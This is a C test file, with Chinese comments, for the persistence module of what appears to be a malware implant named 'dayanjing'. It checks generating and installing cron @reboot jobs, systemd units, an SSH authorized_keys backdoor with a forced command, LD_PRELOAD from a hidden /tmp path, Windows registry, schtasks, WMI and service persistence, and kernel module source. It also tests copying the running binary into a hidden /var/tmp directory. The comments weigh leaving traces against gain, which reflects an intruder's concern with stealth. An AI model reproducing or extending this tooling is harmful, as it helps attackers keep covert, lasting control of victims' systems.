#include "persist.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

static int fails = 0, total = 0;
static void ck(const char *name, int cond) {
    total++;
    if (!cond) { fails++; printf("  FAIL: %s\n", name); }
    else printf("  ok  : %s\n", name);
}

static int file_has(const char *path, const char *needle) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char buf[8192]; size_t n = fread(buf, 1, sizeof buf - 1, f);
    fclose(f); buf[n] = '\0';
    return strstr(buf, needle) != NULL;
}
static int count_substr(const char *path, const char *needle) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char buf[8192]; size_t n = fread(buf, 1, sizeof buf - 1, f);
    fclose(f); buf[n] = '\0';
    int c = 0; const char *p = buf;
    while ((p = strstr(p, needle)) != NULL) { c++; p += strlen(needle); }
    return c;
}
static int exists(const char *p) { struct stat st; return stat(p, &st) == 0; }
static int islink(const char *p) { struct stat st; return lstat(p, &st) == 0 && S_ISLNK(st.st_mode); }

int main(void) {
    printf("=== 09_persistence 真实持久化测试 ===\n");
    char buf[4096];

    /* ---- generate ---- */
    ck("cron line", persist_generate(PERSIST_CRON, "/bin/agent", buf, sizeof buf) > 0 &&
                    strstr(buf, "@reboot") != NULL && strstr(buf, "/bin/agent") != NULL);
    ck("systemd unit", persist_generate(PERSIST_SYSTEMD, "/bin/agent", buf, sizeof buf) > 0 &&
                       strstr(buf, "[Unit]") != NULL && strstr(buf, "ExecStart=/bin/agent") != NULL &&
                       strstr(buf, "multi-user.target") != NULL);
    ck("launchagent", persist_generate(PERSIST_LAUNCHAGENT, "/bin/agent", buf, sizeof buf) > 0 &&
                      strstr(buf, "<plist") != NULL && strstr(buf, "com.dayanjing.agent") != NULL);
    ck("ld_preload", persist_generate(PERSIST_LDPRELOAD, "/tmp/.x.so", buf, sizeof buf) > 0 &&
                     strstr(buf, "/tmp/.x.so") != NULL);
    /* 未注入真实公钥时必须拒绝生成：占位 key 无法认证，
     * 装上了也永远登不进去，比不装更糟（留痕 + 零收益）。 */
    ck("ssh_key 未注入公钥即拒绝", persist_generate(PERSIST_SSHKEY, "id", buf, sizeof buf) == 0);
    ck("注入真实公钥行", persist_sshkey_pubkey(
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExamplePubKeyBlobForUnitTest comment") == 0);
    ck("ssh_key forced cmd", persist_generate(PERSIST_SSHKEY, "id", buf, sizeof buf) > 0 &&
                             strstr(buf, "command=\"id\"") != NULL &&
                             strstr(buf, "ssh-ed25519 AAAAC3Nza") != NULL);
    /* 类型前缀必须来自注入的整行，不能写死 ssh-rsa 去接 ed25519 blob */
    ck("ssh_key 类型随注入行", strstr(buf, "ssh-rsa") == NULL);
    ck("forced cmd 含引号被拒",
       persist_generate(PERSIST_SSHKEY, "id \"x\"", buf, sizeof buf) == 0);
    ck("非法公钥行被拒(无类型前缀)", persist_sshkey_pubkey("AAAAB3NzaC1yc2E") == -1);
    ck("非法公钥行被拒(多行)", persist_sshkey_pubkey("ssh-rsa AAA\nssh-rsa BBB") == -1);
    ck("非法公钥行被拒(空)", persist_sshkey_pubkey("") == -1);
    ck("registry_run", persist_generate(PERSIST_REGISTRY, "agent.exe", buf, sizeof buf) > 0 &&
                       strstr(buf, "CurrentVersion\\Run") != NULL);
    ck("schtask", persist_generate(PERSIST_SCHTASK, "agent.exe", buf, sizeof buf) > 0 &&
                  strstr(buf, "schtasks") != NULL);
    ck("wmi_event", persist_generate(PERSIST_WMI, "agent.exe", buf, sizeof buf) > 0 &&
                    strstr(buf, "__EventFilter") != NULL);
    ck("win_service", persist_generate(PERSIST_SERVICE, "agent.exe", buf, sizeof buf) > 0 &&
                      strstr(buf, "sc create") != NULL);
    ck("lkm generate", persist_generate(PERSIST_LKM, NULL, buf, sizeof buf) > 0);
    ck("method count == 12", persist_method_count() == 12);
    ck("method_at(0) cron", persist_method_at(0) != NULL && persist_method_at(0)->id == PERSIST_CRON);
    ck("method_at(99) NULL", persist_method_at(99) == NULL);

    /* ---- 真实路径安装（挂假根，不污染宿主） ---- */
    setenv("HOME", "/root", 1);
    const char *root = "/tmp/persist_test_root";
    char rmcmd[256]; snprintf(rmcmd, sizeof rmcmd, "rm -rf %s", root);
    (void)system(rmcmd);
    mkdir(root, 0755);

    char binp[512] = {0};
    ck("drop self", persist_drop_self(root, "/var/tmp/.system-cache", binp, sizeof binp) == 0);
    ck("bin path endswith /agent", strstr(binp, "/var/tmp/.system-cache/agent") != NULL);
    ck("dropped file exists", exists(binp));
    {
        struct stat s1, s2;
        int eq = (stat("/proc/self/exe", &s1) == 0 && stat(binp, &s2) == 0 &&
                  s1.st_size == s2.st_size && s1.st_size > 0);
        ck("dropped size == /proc/self/exe", eq);
    }

    ck("install systemd", persist_install(PERSIST_SYSTEMD, root, binp) == 0);
    {
        char p[512]; snprintf(p, sizeof p, "%s/etc/systemd/system/dayanjing.service", root);
        ck("systemd unit content", file_has(p, "ExecStart=") && file_has(p, binp));
        char w[512]; snprintf(w, sizeof w,
            "%s/etc/systemd/system/multi-user.target.wants/dayanjing.service", root);
        ck("systemd wants symlink", islink(w));
    }
    ck("install cron", persist_install(PERSIST_CRON, root, binp) == 0);
    {
        char p[512]; snprintf(p, sizeof p, "%s/etc/cron.d/dayanjing", root);
        ck("cron @reboot content", file_has(p, "@reboot") && file_has(p, binp));
    }
    ck("install sshkey", persist_install(PERSIST_SSHKEY, root, binp) == 0);
    {
        char p[512]; snprintf(p, sizeof p, "%s/root/.ssh/authorized_keys", root);
        ck("sshkey marker present", file_has(p, "do-not-edit:managed"));
        ck("sshkey command=bin", file_has(p, binp));
    }
    ck("installed(systemd)==1", persist_installed(root, PERSIST_SYSTEMD) == 1);
    ck("installed(cron)==1", persist_installed(root, PERSIST_CRON) == 1);
    ck("installed(sshkey)==1", persist_installed(root, PERSIST_SSHKEY) == 1);

    /* ---- 幂等：再次 ensure 应返回 1（已驻留）且不重复写入 ---- */
    {
        char b2[512]; int meth[3] = {0};
        int r = persist_linux_ensure(root, b2, sizeof b2, meth, 3);
        ck("ensure again -> 1 (already)", r == 1);
        ck("ensure methods all 1", meth[0] && meth[1] && meth[2]);
        char p[512]; snprintf(p, sizeof p, "%s/etc/cron.d/dayanjing", root);
        ck("cron not duplicated", count_substr(p, "@reboot") == 1);
        char q[512]; snprintf(q, sizeof q, "%s/root/.ssh/authorized_keys", root);
        ck("sshkey marker not duplicated", count_substr(q, "do-not-edit:managed") == 1);
    }
    {
        int meth[3] = {0};
        ck("query count == 3", persist_linux_query(root, meth, 3) == 3);
    }

    /* ---- 卸载 ---- */
    ck("uninstall systemd", persist_uninstall(PERSIST_SYSTEMD, root, NULL) == 0);
    ck("uninstall cron", persist_uninstall(PERSIST_CRON, root, NULL) == 0);
    ck("uninstall sshkey", persist_uninstall(PERSIST_SSHKEY, root, NULL) == 0);
    ck("after uninstall systemd==0", persist_installed(root, PERSIST_SYSTEMD) == 0);
    ck("after uninstall cron==0", persist_installed(root, PERSIST_CRON) == 0);
    ck("after uninstall sshkey==0", persist_installed(root, PERSIST_SSHKEY) == 0);
    {
        char q[512]; snprintf(q, sizeof q, "%s/root/.ssh/authorized_keys", root);
        ck("sshkey marker gone", !file_has(q, "do-not-edit:managed"));
    }
    /* Windows 专用方法在 Linux 上应返回 -2 */
    ck("registry unsupported", persist_install(PERSIST_REGISTRY, root, "a.exe") == -2);
    ck("schtask unsupported", persist_install(PERSIST_SCHTASK, root, "a.exe") == -2);
    ck("wmi unsupported", persist_install(PERSIST_WMI, root, "a.exe") == -2);
    ck("service unsupported", persist_install(PERSIST_SERVICE, root, "a.exe") == -2);
    ck("lkm unsupported", persist_install(PERSIST_LKM, root, NULL) == -2);
    ck("uninstall registry unsupported", persist_uninstall(PERSIST_REGISTRY, root, NULL) == -2);

    /* ---- 内核源码 ---- */
    const char *src = persist_kernel_source();
    ck("kernel source non-empty", src != NULL && strlen(src) > 50 &&
                                  strstr(src, "module_init") != NULL);

    (void)system(rmcmd);
    printf("--- total=%d pass=%d fail=%d ---\n", total, total - fails, fails);
    return fails ? 1 : 0;
}
